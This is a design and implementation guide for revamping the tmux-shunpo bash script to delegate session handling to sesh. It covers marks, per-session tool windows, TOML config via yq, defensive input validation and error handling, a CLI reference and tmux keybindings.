# tmux-shunpo — Revamp Implementation Guide

This document is the single source of truth for the tmux-shunpo v0.1.0 revamp.
Read it fully before writing any code.

---

## 1. What is tmux-shunpo?

Harpoon2-style tmux navigation. Two core features:

1. **Marks (1-9)** — instant jump to bookmarked directories (creates/switches tmux sessions)
2. **Tools (@1-@9)** — per-session persistent window slots with bound commands

Named after Bleach's "shunpo" (flash step). The point is **zero-thought, muscle-memory navigation**.

## 2. What is this revamp?

**Delegate all session management to [sesh](https://github.com/joshmedeski/sesh)** and slim tmux-shunpo down to what only it can do: marks + tools + keybinding-friendly goto.

### Why sesh?

sesh is a Go binary that already handles:
- Smart session naming (git repo, remote, directory)
- zoxide integration (frecency-based directory ranking)
- Session creation/attachment (`sesh connect <path-or-name>`)
- Session listing with filtering (`sesh list -t -c -z --icons`)
- Per-project startup commands via `sesh.toml`
- Session preview (`sesh preview`)
- Last-session switching (`sesh last`)
- Window management (`sesh window`)
- Caching for fast repeated calls

tmux-shunpo currently reimplements session creation, directory discovery, and fuzzy search poorly. Delegating to sesh removes ~500 lines and gains all of the above for free.

### What shunpo keeps (unique value sesh doesn't have)

- **Marks (1-9)**: Harpoon-style bookmarks → instant session jump
- **Tools (@1-@9)**: Per-session window slots with persistent commands
- **Editors**: nvim popup for marks and tools editing
- **Keybinding-first design**: Every operation works from `run-shell` (no TTY needed)

### What shunpo removes

| Removed | Replaced by |
|---|---|
| `session_create_or_switch()` | `sesh connect "$path"` |
| `session_check_exists()` | sesh handles internally |
| `get_session_name()` | sesh names sessions |
| `sanitize_session_name()` | sesh sanitizes |
| `project_find_directories()` | `sesh list -z` (zoxide) |
| `project_select_directory()` | `sesh list --icons \| fzf` |
| `project_search_and_switch()` | `sesh connect "$(sesh list \| fzf)"` |
| `path_resolve_directory()` | sesh resolves paths |
| `validate_session_name()` | sesh validates |
| Custom TOML-like config parser | `yq -p toml` for real TOML |

---

## 3. Architecture After Revamp

```
tmux-shunpo (~600 lines, down from 1674)
├── Core utilities (notify, error_exit, validate_range, command_exists)
├── Config (TOML via yq -p toml)
├── Marks management (parse, add, remove, rearrange, jump, editor)
├── Tools management (get, navigate, editor)
├── Search (delegate to sesh + fzf/sk)
└── CLI (main argument parser)
```

### Dependencies

| Tool | Required? | Purpose |
|---|---|---|
| bash >= 4.0 | Yes | Associative arrays, mapfile |
| tmux >= 3.2 | Yes | `display-popup -E` for editors |
| sesh | Yes | **NEW** — session management backend |
| yq (Go) | Yes | **NEW** — TOML config parsing |
| gum | Yes | **NEW** — TUI widgets for marks/tools editors |
| fzf or sk | Yes (one) | Fuzzy finder for search |

### sesh CLI Reference (key commands)

```bash
sesh connect <path-or-name>     # Create/switch to session
sesh connect --switch <name>    # Switch only (from within tmux)
sesh list                       # All sources (tmux + config + zoxide)
sesh list -t                    # Active tmux sessions only
sesh list -c                    # Configured sessions only
sesh list -z                    # Zoxide directories only
sesh list --icons               # With Nerd Font type icons
sesh list -i                    # Short alias for --icons
sesh last                       # Switch to previous session
sesh preview <session>          # Preview for fzf
sesh root                       # Git root of current session
```

---

## 4. Config & Data Integration with sesh

### Single source of truth: sesh.toml

sesh.toml (`~/.config/sesh/sesh.toml`) already defines projects and window
templates. tmux-shunpo reads sesh.toml for tool template expansion instead of
maintaining its own duplicate `[tool-templates]` section.

**sesh.toml has `additionalProperties: false`** — shunpo CANNOT add custom
keys to sesh.toml. But it CAN read existing sesh config.

#### How marks integrate with sesh

Marks store **sesh session names** (not raw paths):

```
# ~/.local/share/tmux-shunpo/marks
1: aggen
2: dotfiles
3: notes
```

`--goto 1` → `sesh connect aggen`. sesh resolves the name to a path, creates
the session if needed, applies startup commands from sesh.toml, etc.

`--add` resolves current session name via `tmux display-message -p '#S'` and
stores that name. If outside tmux, falls back to storing the directory path
(sesh connect accepts both).

#### How tool templates integrate with sesh

sesh `[[window]]` definitions serve as tool templates:

```toml
# sesh.toml
[[window]]
name = "editor"
startup_script = "nvim ."

[[window]]
name = "devserver"
startup_script = "cargo watch -x run"

[[window]]
name = "agent"
startup_script = "pi"
```

In shunpo tools files, `@editor` expands by reading sesh.toml:

```
# ~/.local/share/tmux-shunpo/tools/aggen
1: @editor          → reads sesh [[window]] name="editor" → "nvim ."
2: @devserver       → reads sesh [[window]] name="devserver" → "cargo watch -x run"
3: cargo test       → inline command, no template needed
```

**Resolution**: shunpo reads `sesh.toml` window definitions via yq:

```bash
# Resolve @template-name from sesh.toml [[window]] entries
sesh_resolve_window_template() {
    local template_name="$1"
    local sesh_config="${XDG_CONFIG_HOME:-$HOME/.config}/sesh/sesh.toml"
    if [[ ! -f "$sesh_config" ]]; then
        return 1
    fi
    yq -p toml ".window[] | select(.name == \"${template_name}\") | .startup_script // \"\"" "$sesh_config" 2>/dev/null
}
```

#### Auto-populating tools for new sessions

When a tools file doesn't exist for a session, shunpo auto-generates it from
sesh.toml. This means every new session gets the right tools pre-configured—
zero manual setup.

**Resolution order** (first match wins):

1. `[[session]]` with matching `name` → use its `windows` array
2. `[[wildcard]]` with glob `pattern` matching the session path → use its `windows`
3. `[default_session]` → use its `windows`
4. None of the above → no auto-generation, tools file stays empty

The `windows` array entries map to tool slots 1–N as `@name` references:

```toml
# sesh.toml
[default_session]
windows = ["editor", "shell"]

[[session]]
name = "aggen"
path = "~/Code/aggen"
windows = ["editor", "tests", "agent"]

[[wildcard]]
pattern = "~/Code/*"
windows = ["editor", "devserver", "shell"]

[[window]]
name = "editor"
startup_script = "nvim ."

[[window]]
name = "tests"
startup_script = "bats tests/"

[[window]]
name = "devserver"
startup_script = "cargo watch -x run"

[[window]]
name = "agent"
startup_script = "pi"

[[window]]
name = "shell"
```

**Result for session `aggen`** (matched by `[[session]]` name):

```
# auto-generated from sesh.toml [[session]] name="aggen"
1: @editor
2: @tests
3: @agent
```

**Result for session `some-code-project`** at `~/Code/some-code-project`
(matched by `[[wildcard]]` pattern `~/Code/*`):

```
# auto-generated from sesh.toml [[wildcard]] ~/Code/*
1: @editor
2: @devserver
3: @shell
```

**Result for a random zoxide session** (no session/wildcard match, falls back
to `[default_session]`):

```
# auto-generated from sesh.toml [default_session]
1: @editor
2: @shell
```

**Lazy initialization**: tools file is generated on first access, not at
session creation time. This happens transparently inside `get_tool()` and
`ui_edit_tools()`:

```bash
# Called before any tool read/write. Creates tools file from sesh.toml
# if it doesn't exist yet. Returns 0 if file exists (created or pre-existing).
tool_auto_populate() {
    local session_name="$1"
    local tools_file="${DATA_DIR}/tools/${session_name}"

    # Already exists — don't overwrite user customizations
    if [[ -f "$tools_file" ]]; then
        return 0
    fi

    local sesh_config="${XDG_CONFIG_HOME:-$HOME/.config}/sesh/sesh.toml"
    if [[ ! -f "$sesh_config" ]]; then
        return 0
    fi

    local windows_json

    # 1. Try [[session]] match by name
    windows_json=$(yq -p toml -o json \
        ".session[] | select(.name == \"${session_name}\") | .windows // []" \
        "$sesh_config" 2>/dev/null)

    # 2. Try [[wildcard]] match by pattern against session path
    if [[ -z "$windows_json" || "$windows_json" == "[]" ]]; then
        # Resolve session path: try sesh session path, or tmux session_path
        local session_path
        session_path=$(yq -p toml \
            ".session[] | select(.name == \"${session_name}\") | .path // \"\"" \
            "$sesh_config" 2>/dev/null)
        if [[ -z "$session_path" ]]; then
            session_path=$(tmux display-message -p '#{session_path}' 2>/dev/null) || true
        fi
        # Expand tilde for matching
        session_path="${session_path/#\~/$HOME}"

        if [[ -n "$session_path" ]]; then
            # Read all wildcard patterns + windows, find first match
            local num_wildcards
            num_wildcards=$(yq -p toml '.wildcard | length // 0' "$sesh_config" 2>/dev/null)
            local i
            for ((i = 0; i < num_wildcards; i++)); do
                local pattern
                pattern=$(yq -p toml ".wildcard[$i].pattern // \"\"" "$sesh_config" 2>/dev/null)
                pattern="${pattern/#\~/$HOME}"
                # Glob match (bash extended globbing)
                # shellcheck disable=SC2254  # pattern is intentionally a glob
                case "$session_path" in
                    $pattern)
                        windows_json=$(yq -p toml -o json \
                            ".wildcard[$i].windows // []" \
                            "$sesh_config" 2>/dev/null)
                        break
                        ;;
                esac
            done
        fi
    fi

    # 3. Fall back to [default_session]
    if [[ -z "$windows_json" || "$windows_json" == "[]" ]]; then
        windows_json=$(yq -p toml -o json \
            '.default_session.windows // []' \
            "$sesh_config" 2>/dev/null)
    fi

    # 4. Nothing configured — no auto-generation
    if [[ -z "$windows_json" || "$windows_json" == "[]" ]]; then
        return 0
    fi

    # Generate tools file: array index → slot number, value → @name
    mkdir -p "$(dirname "$tools_file")"
    {
        echo "# auto-generated from sesh.toml"
        local slot=1
        # Parse JSON array to lines
        echo "$windows_json" | yq -o tsv '.[]' 2>/dev/null | while IFS= read -r window_name; do
            [[ -z "$window_name" ]] && continue
            [[ $slot -gt 9 ]] && break
            echo "${slot}: @${window_name}"
            slot=$((slot + 1))
        done
    } > "$tools_file"

    return 0
}
```

**Integration points** — call `tool_auto_populate` before reading tools:

```bash
get_tool() {
    local session_name="$1"
    local slot="$2"
    tool_auto_populate "$session_name"  # lazy init
    # ... rest of existing get_tool logic
}

ui_edit_tools() {
    local session_name
    session_name=$(tmux display-message -p '#S' 2>/dev/null) || ...
    tool_auto_populate "$session_name"  # lazy init before showing editor
    # ... rest of editor logic
}
```

**Key behavior**: auto-populate only runs when tools file is **missing**. Once
created (whether auto-generated or user-edited), it is never overwritten.
User customizations always take priority.

### shunpo-only config: `~/.config/tmux-shunpo/config.toml`

Only UI/behavior settings that don't belong in sesh.toml:

```toml
# Tool window base index. Slot N → window (base + N - 1).
# Default: 88 → tools use windows 88-96
tool_window_base = 88

# Shell init delay (seconds) — wait for prompt themes like Starship
shell_init_delay = 0.2

# Window name max length
window_name_max_length = 20

# Popup dimensions for tmux display-popup
[ui]
popup_width = "80%"
popup_height = "70%"
```

No `[tool-templates]` — those come from sesh.toml `[[window]]` entries.

### Config parsing with yq

```bash
# Read shunpo config
tool_window_base=$(yq -p toml '.tool_window_base // 88' "$CONFIG_FILE")

# Read sesh window template
local sesh_config="${XDG_CONFIG_HOME:-$HOME/.config}/sesh/sesh.toml"
command=$(yq -p toml '.window[] | select(.name == "editor") | .startup_script' "$sesh_config")
```

### Marks file (runtime state)

File: `~/.local/share/tmux-shunpo/marks`

```
# Marks store sesh session names (or paths as fallback)
1: aggen
2: dotfiles
3: ~/Notes
```

### Tools files (per-session runtime state)

File: `~/.local/share/tmux-shunpo/tools/<session-name>`

```
# @references resolve from sesh.toml [[window]] definitions
1: @editor
2: @devserver
3: cargo test
```

---

## 5. Implementation Plan (ordered)

### Phase 1: Foundation

1. **Add yq dependency check** at startup (same pattern as sesh check)
2. **Add sesh dependency check** at startup
3. **Replace config parser** — delete `parse_section`, `config_directories_callback`, `config_load_directories`. New function `cfg_load` reads TOML via `yq -p toml`.
4. **Create `config.toml.example`** — replace `config.conf.example`

### Phase 2: Session delegation to sesh

5. **Replace `mark_jump_to`** — use `sesh connect "$path"` instead of `session_create_or_switch`
6. **Replace `project_search_and_switch`** — use `sesh list --icons | fzf` → `sesh connect`
7. **Delete** all session management functions:
   - `session_create_or_switch`
   - `session_check_exists`
   - `get_session_name`
   - `sanitize_session_name`
   - `validate_session_name` (keep for tools file naming — or use tmux's `#S` directly)
   - `project_find_directories`
   - `project_select_directory`
   - `path_resolve_directory`

### Phase 3: gum-based editors (replaces nvim popups)

8. **Replace `ui_edit_marks`** with gum-based mark editor (see Section 16)
9. **Replace `ui_edit_tools`** with gum-based tool editor (see Section 16)
10. **Delete** all nvim popup code, `file_create_secure_temp`, `file_hash`, `marks_to_lines`, `lines_to_marks`

### Phase 4: Tests

11. **Set up bats test infrastructure** — see Section 17
12. **Write tests for every function** — each phase's code must have tests before moving on
13. **ShellCheck must pass clean** — `shellcheck -x -o all -s bash tmux-shunpo` with zero warnings

### Phase 5: Polish

14. **Update `main()` argument parser** — keep `--goto`, `--add`, `--remove`, `--marks`, `--tools`, `--search`, `--reset`, `--help`, `--version`. Remove direct path arguments (delegate to `sesh connect "$path"`).
15. **Update `show_usage()`** — reflect new sesh-based workflow
16. **Update version** to `0.1.0`
17. **Create new `config.toml.example`**, delete `config.conf.example`

### What NOT to change

- **Core marks logic** — parse_marks, mark_rearrange. Data format works fine.
- **Core tools logic** — get_tool, navigate_to_tool, generate_window_name. Window management works fine.
- **validate_command** — keep as-is for tool command validation.

### Implementation rule: tests are NOT optional

Every function implemented or modified MUST have corresponding tests BEFORE
the work item is considered complete. Do not defer tests to a later phase.
Write them alongside the code.

---

## 6. Key Function Transformations

### mark_jump_to (before → after)

```bash
# BEFORE:
mark_jump_to() {
    ...
    session_create_or_switch "$path" ""
}

# AFTER:
mark_jump_to() {
    local target="$1"
    local session_ref=""

    if [[ -z "$target" ]]; then
        [[ -t 0 ]] && echo "Error: No target specified for goto" >&2
        exit 1
    fi

    if [[ "$target" =~ ^[0-9]+$ ]]; then
        if session_ref=$(parse_marks "$target"); then
            # session_ref is a sesh session name or path
            # sesh connect handles both — creates if needed, switches if exists
            sesh connect "$session_ref"
            return 0
        fi
    fi

    notify "Mark '$target' not found"
    return 1
}
```

### mark_add (revised — stores session name)

```bash
mark_add() {
    local session_ref

    if [[ -n "${TMUX:-}" ]]; then
        # Inside tmux: use current session name (what sesh connect understands)
        session_ref=$(tmux display-message -p '#S' 2>/dev/null) || {
            notify "Cannot determine current session" "error"
            return 1
        }
    else
        # Outside tmux: store current directory path as fallback
        session_ref="$PWD"
    fi

    # ... rest of duplicate/slot logic stays the same,
    # but stores session_ref instead of current_path
}
```

### project_search_and_switch (before → after)

```bash
# BEFORE: 50+ lines of custom directory scanning + fuzzy finder + session creation

# AFTER:
search_and_connect() {
    local selected

    if [[ ! -t 0 && -n "${TMUX:-}" ]]; then
        # Called from keybinding — use tmux popup
        local temp_file
        temp_file=$(mktemp -t tmux-shunpo.XXXXXX) || {
            notify "Error: Could not create temporary file" "error"
            return 1
        }
        trap "rm -f '$temp_file'" EXIT INT TERM

        set +e
        tmux popup -E -w 90% -h 80% "sesh list --icons | fzf --ansi --no-sort \
            --border-label ' shunpo → sesh ' \
            --prompt '⚡ ' \
            --header '  ^a all  ^t tmux  ^g configs  ^z zoxide  ^d kill' \
            --bind 'tab:down,btab:up' \
            --bind 'ctrl-a:change-prompt(⚡  )+reload(sesh list --icons)' \
            --bind 'ctrl-t:change-prompt(🪟  )+reload(sesh list -t --icons)' \
            --bind 'ctrl-g:change-prompt(⚙️  )+reload(sesh list -c --icons)' \
            --bind 'ctrl-z:change-prompt(📁  )+reload(sesh list -z --icons)' \
            --bind 'ctrl-d:execute(tmux kill-session -t {2..})+change-prompt(⚡  )+reload(sesh list --icons)' \
            --preview-window 'right:55%' \
            --preview 'sesh preview {}' > '$temp_file'"
        local rc=$?
        set -e

        if [[ $rc -eq 0 && -s "$temp_file" ]]; then
            selected=$(head -n1 "$temp_file")
        fi
        rm -f "$temp_file"
    else
        # Direct call with TTY
        set +e
        selected=$(sesh list --icons | fzf --ansi --no-sort \
            --height "${CFG_FINDER_HEIGHT_PERCENT}%" \
            --layout reverse --border \
            --prompt '⚡ ' \
            --preview 'sesh preview {}')
        set -e
    fi

    if [[ -n "$selected" ]]; then
        sesh connect "$selected"
    else
        notify "No session selected. Cancelled."
    fi
}
```

### cfg_load (new, replaces parse_section)

```bash
cfg_load() {
    # Defaults
    CFG_TOOL_WINDOW_BASE=88
    CFG_SHELL_INIT_DELAY=0.2
    CFG_WINDOW_NAME_MAX_LENGTH=20
    CFG_POPUP_WIDTH="80%"
    CFG_POPUP_HEIGHT="70%"

    if [[ ! -f "$CONFIG_FILE" ]]; then
        return 0
    fi

    CFG_TOOL_WINDOW_BASE=$(yq -p toml '.tool_window_base // 88' "$CONFIG_FILE")
    CFG_SHELL_INIT_DELAY=$(yq -p toml '.shell_init_delay // 0.2' "$CONFIG_FILE")
    CFG_WINDOW_NAME_MAX_LENGTH=$(yq -p toml '.window_name_max_length // 20' "$CONFIG_FILE")
    CFG_POPUP_WIDTH=$(yq -p toml '.ui.popup_width // "80%"' "$CONFIG_FILE")
    CFG_POPUP_HEIGHT=$(yq -p toml '.ui.popup_height // "70%"' "$CONFIG_FILE")
}
```

### config_load_tool_templates (reads sesh.toml [[window]] entries)

```bash
config_load_tool_templates() {
    local sesh_config="${XDG_CONFIG_HOME:-$HOME/.config}/sesh/sesh.toml"
    if [[ ! -f "$sesh_config" ]]; then
        return 0
    fi
    # Output name:::command pairs from sesh [[window]] definitions
    yq -p toml '.window[] | [.name, .startup_script // ""] | @tsv' "$sesh_config" 2>/dev/null \
        | while IFS=$'\t' read -r name command; do
            [[ -n "$name" && -n "$command" ]] && echo "${name}:::${command}"
        done
}
```

---

## 7. Coding Standards

### Bash

- `set -euo pipefail` at top
- Every variable double-quoted: `"$var"`, `"${array[@]}"`
- Every function-local variable: `local`
- Separate declaration and assignment: `local x; x=$(cmd)`
- Constants: `readonly`
- No `eval`. Ever.
- `--` before user-supplied arguments: `grep -F -- "$input" "$file"`
- Errors to stderr: `echo "error" >&2`
- Temp files via `mktemp`, cleanup via `trap EXIT`
- Must pass: `shellcheck -x -o all -s bash tmux-shunpo`

### Portability (macOS primary, Linux secondary)

| Avoid | Use instead |
|---|---|
| `sed -i` | Write to temp file + `mv` |
| `grep -P` | `grep -E` |
| `echo -e` | `printf` |
| `readlink -f` | `realpath` or basename trick |

---

## 8. Security Controls

tmux-shunpo handles user input (mark values, tool commands, slot numbers),
reads external config files (sesh.toml, shunpo config.toml), and sends
keystrokes to live tmux sessions. Every input path is a potential attack
surface.

### Security ID table

| ID | Control | Summary |
|---|---|---|
| SEC-01 | Tool command validation | Whitelist `^[a-zA-Z0-9 +./_:@=~-]+$` — no pipes, semicolons, command substitution, redirects |
| SEC-02 | Path/command escaping for tmux send-keys | `printf '%q'` applied to all values sent to tmux panes via `send-keys -l` |
| SEC-03 | Session name validation in tools files | Session names from `tmux display-message -p '#S'` re-validated before use as filenames |
| SEC-04 | Slot range validation | Always validated 1–9 via `validate_range` before use as array index or window offset |
| SEC-05 | Config file integrity | Ownership check + reject world-writable config files (both shunpo and sesh configs) |
| SEC-06 | No eval, ever | Config parsed by `yq` only. No `eval`, `source`, `bash -c "$var"` on any external data |
| SEC-07 | Path traversal protection | Session names used as filenames must not contain `..`, `/`, or start with `-` |
| SEC-08 | Atomic file writes | All file mutations use write-to-temp + `mv` to prevent corruption on crash |
| SEC-09 | Template name validation | `@template` references validated against `^[a-zA-Z0-9_-]+$` before yq query |
| SEC-10 | Temp file hygiene | All temp files via `mktemp` with restrictive permissions, cleaned up via `trap EXIT` |

### 8a. Input Validation Requirements

#### Tool commands (SEC-01)

`validate_command` must reject all shell metacharacters. Whitelist approach:

```bash
# Allow: a-z A-Z 0-9 space - + . / _ : @ = ~
# Block: ; | & $ ` ( ) { } < > ! ' " \ * ? [ ]
validate_command() {
    local command="$1"
    if [[ -z "${command// }" ]]; then
        echo "error: command cannot be empty" >&2
        return 1
    fi
    if [[ ! "$command" =~ ^[a-zA-Z0-9\ +./_:@=~-]+$ ]]; then
        echo "error: invalid characters in command" >&2
        return 1
    fi
    if [[ "$command" =~ \.\./\.\. ]]; then
        echo "error: directory traversal not allowed" >&2
        return 1
    fi
    return 0
}
```

Every tool command — whether from user input (gum editor), tools file, or
template expansion — MUST pass through `validate_command` before execution.

#### Session names used as filenames (SEC-03, SEC-07)

tmux session names come from `tmux display-message -p '#S'`. These are used
as filenames for tools files (`$DATA_DIR/tools/<session-name>`). Validation:

```bash
validate_session_name() {
    local name="$1"
    # Reject path traversal
    if [[ "$name" =~ \.\./  ]] || [[ "$name" =~ ^/ ]] || [[ "$name" =~ \.\. ]]; then
        return 1
    fi
    # Only allow alphanumeric, dash, underscore
    if [[ ! "$name" =~ ^[a-zA-Z0-9_-]+$ ]]; then
        return 1
    fi
    return 0
}
```

Call this before any file operation using a session name as a path component.

#### Slot numbers (SEC-04)

Slots must be integers 1–9. Validate before use:

```bash
validate_range "$slot" 1 9 "Slot must be between 1-9"
```

Never use unvalidated slot numbers in arithmetic, array indices, or tmux
window calculations.

#### Template names (SEC-09)

`@template` references parsed from tools files or gum input:

```bash
validate_template_name() {
    local name="$1"
    if [[ ! "$name" =~ ^[a-zA-Z0-9_-]+$ ]]; then
        echo "error: invalid template name: $name" >&2
        return 1
    fi
    return 0
}
```

This prevents injection via crafted template names into yq queries.

### 8b. Config File Security (SEC-05, SEC-06)

#### Ownership and permissions check

Both config files (`config.toml` and `sesh.toml`) are read at startup.
Before parsing, verify:

1. **File owner matches current user** — reject if owned by another user
2. **Not world-writable** — warn and reject if permissions allow other users to write

```bash
cfg_check_file_safety() {
    local filepath="$1"
    [[ ! -f "$filepath" ]] && return 0  # missing file is fine (defaults apply)

    # Check ownership (portable macOS/Linux)
    local file_owner
    if stat -f '%u' "$filepath" >/dev/null 2>&1; then
        file_owner=$(stat -f '%u' "$filepath")   # macOS
    else
        file_owner=$(stat -c '%u' "$filepath")   # Linux
    fi

    if [[ "$file_owner" != "$(id -u)" ]]; then
        echo "error: config file owned by another user: $filepath" >&2
        return 1
    fi

    # Check permissions
    local file_perms
    if stat -f '%Lp' "$filepath" >/dev/null 2>&1; then
        file_perms=$(stat -f '%Lp' "$filepath")  # macOS: e.g. "644"
    else
        file_perms=$(stat -c '%a' "$filepath")   # Linux: e.g. "644"
    fi

    local world_bit="${file_perms:2:1}"
    if [[ "${world_bit}" =~ [2367] ]]; then
        echo "error: config file is world-writable: $filepath (mode $file_perms)" >&2
        return 1
    fi

    return 0
}
```

Call on both files:
```bash
cfg_check_file_safety "$CONFIG_FILE" || return 1
cfg_check_file_safety "${XDG_CONFIG_HOME:-$HOME/.config}/sesh/sesh.toml" || return 1
```

#### No eval on config data (SEC-06)

Config values MUST only flow through `yq` for parsing. Never:
- `eval "$(yq ... )"` 
- `source` any config file
- `bash -c "$config_value"`
- Interpolate config values into shell commands without validation

All config values that become shell commands (tool commands, startup scripts)
must pass through `validate_command` after reading from yq.

### 8c. tmux Keystroke Injection (SEC-02)

When sending commands to tmux panes via `send-keys`, values must be escaped
to prevent the receiving shell from interpreting metacharacters:

```bash
# Escape individual values, not entire command strings
local escaped_path
escaped_path=$(printf '%q' "$some_path")
tmux send-keys -t ":${window_index}" -l -- "cd ${escaped_path}"
```

**Rules:**
- Use `send-keys -l` (literal mode) — prevents tmux key interpretation
- Use `--` before user-supplied text — prevents option injection
- Escape individual substituted values with `printf '%q'`
- Do NOT escape entire command strings (would break spacing)
- Tool commands from `validate_command` are safe (whitelist-only chars) but
  paths may contain spaces/special chars and MUST be escaped

### 8d. Atomic File Writes (SEC-08)

All file mutations (marks, tools) must use atomic write pattern:

```bash
# Write to temp file first, then atomic move
local temp_file="${target_file}.tmp.$$"
{
    echo "# header"
    echo "1: @editor"
} > "$temp_file" || { rm -f "$temp_file"; return 1; }
mv -- "$temp_file" "$target_file" || { rm -f "$temp_file"; return 1; }
```

Never write directly to the target file. A crash mid-write would corrupt it.

### 8e. Temp File Hygiene (SEC-10)

All temp files/dirs:
- Created via `mktemp` (never predictable paths like `/tmp/shunpo_$$`)
- Permissions: `mktemp -d` then `chmod 700` on sensitive dirs
- Cleanup via `trap EXIT` (never inline — would be skipped on error)

```bash
local work_dir
work_dir=$(mktemp -d)
trap 'rm -rf "$work_dir"' EXIT
```

---

## 9. Error Handling Patterns

### 9a. Fail-fast with clear messages

Every error MUST go to stderr with a descriptive message. Never silently
swallow failures:

```bash
# Good: clear error, stderr, non-zero exit
session_name=$(tmux display-message -p '#S' 2>/dev/null) || {
    notify "Not in a tmux session" "error"
    return 1
}

# Bad: silent failure
session_name=$(tmux display-message -p '#S' 2>/dev/null) || true
```

### 9b. Context-aware error display

Shunpo runs in two contexts. Errors must render appropriately in both:

| Context | Detection | Error display |
|---|---|---|
| Interactive (TTY) | `[[ -t 0 ]]` | Print to stderr |
| Keybinding (no TTY, inside tmux) | `[[ ! -t 0 && -n "${TMUX:-}" ]]` | `tmux display-message` |

The existing `notify` function handles this. All errors MUST go through
`notify "message" "error"` or `error_exit "message"`, never raw `echo`.

### 9c. Capturing exit codes explicitly

When a command failure is expected/handled, capture the exit code instead of
relying on `set -e` to terminate:

```bash
local rc
local output
output=$(some_command 2>&1) && rc=0 || rc=$?
if [[ $rc -ne 0 ]]; then
    notify "Command failed: $output" "error"
    return 1
fi
```

### 9d. Graceful degradation

When optional features are unavailable, degrade gracefully instead of failing:

| Scenario | Behavior |
|---|---|
| sesh.toml missing | Tool templates unavailable, auto-populate skipped, no error |
| shunpo config.toml missing | All defaults apply, no error |
| No marks file | Empty marks, operations work (create on first `--add`) |
| No tools file for session | Auto-populate attempted, then empty tools if no sesh config |
| fzf/sk not installed | `--search` fails with clear message suggesting install |
| gum not installed | Editors fail with clear message, `--goto` still works |
| Not inside tmux | `--goto @N` and editors fail with clear message, mark file ops still work |

### 9e. External command failures

Every call to an external tool must handle failure:

```bash
# sesh connect can fail (network, config error, etc)
if ! sesh connect "$session_ref"; then
    notify "Failed to connect to session: $session_ref" "error"
    return 1
fi

# yq can fail on malformed TOML
local value
value=$(yq -p toml '.tool_window_base // 88' "$CONFIG_FILE" 2>/dev/null) || {
    notify "Failed to parse config: $CONFIG_FILE" "error"
    return 1
}

# tmux can fail if server not running
local session_name
session_name=$(tmux display-message -p '#S' 2>/dev/null) || {
    notify "tmux not available" "error"
    return 1
}
```

### 9f. Data file corruption recovery

If marks or tools files are corrupted (malformed lines, invalid slots),
parsing functions must skip invalid entries and continue rather than crashing:

```bash
# Inside parse loop: skip malformed lines, don't crash
while IFS= read -r line; do
    [[ -z "$line" || "$line" =~ ^[[:space:]]*# ]] && continue
    if [[ "$line" =~ ^([0-9]+):[[:space:]]*(.+)$ ]]; then
        local slot="${BASH_REMATCH[1]}"
        local value="${BASH_REMATCH[2]}"
        # Validate slot range — skip invalid, don't crash
        [[ "$slot" -lt 1 || "$slot" -gt 9 ]] && continue
        # ... process valid entry
    fi
    # Malformed lines silently skipped (not an error)
done < "$file"
```

### 9g. Dependency checks at startup

Check all required tools before doing anything. Report ALL missing deps at
once (don't fail on the first one):

```bash
check_dependencies() {
    local missing=()
    command -v bash >/dev/null || missing+=("bash>=4.0")
    command -v tmux >/dev/null || missing+=("tmux>=3.2")
    command -v sesh >/dev/null || missing+=("sesh")
    command -v yq >/dev/null   || missing+=("yq (Go version)")
    command -v gum >/dev/null  || missing+=("gum")

    # fzf or sk (at least one)
    if ! command -v fzf >/dev/null && ! command -v sk >/dev/null; then
        missing+=("fzf or sk")
    fi

    if [[ ${#missing[@]} -gt 0 ]]; then
        echo "error: missing required tools: ${missing[*]}" >&2
        return 1
    fi
    return 0
}
```

**Note**: Some commands (`--goto N`, `--add`, `--remove`) can work without
gum. Only editor commands (`--marks`, `--tools`) strictly require gum.
Dependency checks should be context-aware: check gum only when needed.

---

## 10. Manual Testing Notes

No test suite exists yet. Not required for this revamp. Focus on manual testing:

```bash
# Test marks
./tmux-shunpo --add              # stores current session name
./tmux-shunpo --goto 1           # sesh connect to marked session
./tmux-shunpo --marks            # gum-based mark editor in tmux popup

# Test tools
./tmux-shunpo --tools            # gum-based tool editor in tmux popup
./tmux-shunpo --goto @1          # navigate to tool window

# Test @template resolution
# Set tool to "@editor", verify it reads sesh.toml [[window]] name="editor"

# Test search
./tmux-shunpo --search           # should show sesh list in fzf

# Test from keybinding (no TTY)
tmux run-shell "path/to/tmux-shunpo --goto 1"
tmux run-shell "path/to/tmux-shunpo --goto @2"

# Test gum editors in tmux popup
tmux display-popup -E -w 80% -h 70% "path/to/tmux-shunpo --marks"
tmux display-popup -E -w 80% -h 70% "path/to/tmux-shunpo --tools"
```

---

## 11. File Deliverables

After revamp is complete:

```
tmux-shunpo/
├── tmux-shunpo          # Main script (revamped, ~500-600 lines)
├── config.toml.example     # NEW — example TOML config (UI settings only)
├── LICENSE                  # Unchanged
└── .gitignore              # Unchanged
```

Delete: `config.conf.example`

---

## 12. CLI Reference (complete interface contract)

This is the exact CLI that must be implemented. No other flags or behaviors.

```
Usage: tmux-shunpo [OPTION]

Session Navigation:
  --search               Fuzzy search sessions via sesh + fzf (tmux popup when from keybinding)
  --goto N               Jump to mark slot N (1-9) via sesh connect
  --goto @N              Navigate to tool window slot N (1-9)

Mark Management:
  --add                  Mark current session (inside tmux) or current directory (outside tmux)
  --remove N             Remove mark slot N
  --remove all           Remove all marks
  --marks                Interactive mark editor (gum TUI, tmux popup when from keybinding)

Tool Management:
  --tools                Interactive tool editor for current session (gum TUI, tmux popup)

Maintenance:
  --reset [session|all]  Reset tools for current session, or all data

Info:
  -h, --help             Show usage
  -v, --version          Show version
```

### Exit codes

| Code | Meaning |
|---|---|
| 0 | Success |
| 1 | Error or user cancelled |
| 128 | Validation error (invalid input) |

### Keybinding-safe design

Every command works from `tmux run-shell` (no TTY). Commands that need
interactive input (`--search`, `--marks`, `--tools`) auto-wrap in
`tmux display-popup -E` when called without a TTY.

### Recommended tmux.conf bindings

```tmux
# Session navigation
bind-key "T" run-shell "tmux-shunpo --search"       # fuzzy picker
bind-key "L" run-shell "sesh last"                      # last session

# Marks (Alt+number for instant jump)
bind-key -n M-1 run-shell "tmux-shunpo --goto 1"
bind-key -n M-2 run-shell "tmux-shunpo --goto 2"
bind-key -n M-3 run-shell "tmux-shunpo --goto 3"
bind-key -n M-4 run-shell "tmux-shunpo --goto 4"
bind-key -n M-5 run-shell "tmux-shunpo --goto 5"
bind-key "m"   run-shell "tmux-shunpo --marks"       # mark editor
bind-key "M"   run-shell "tmux-shunpo --add"         # quick mark

# Tools (prefix + key for per-session windows)
bind-key "u" run-shell "tmux-shunpo --goto @1"       # tool 1 (e.g. editor)
bind-key "i" run-shell "tmux-shunpo --goto @2"       # tool 2 (e.g. server)
